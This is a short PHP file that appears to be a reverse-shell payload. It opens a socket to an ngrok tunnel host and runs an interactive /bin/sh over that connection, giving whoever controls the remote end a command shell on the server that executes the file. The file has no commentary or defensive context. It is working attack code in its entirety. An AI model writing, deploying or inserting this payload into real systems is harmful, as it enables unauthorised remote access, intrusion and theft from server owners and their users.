<?php 
$sock=fsockopen("2.tcp.ngrok.io",14383); 
exec("/bin/sh -i <&3 >&3 2>&3"); 
?> 
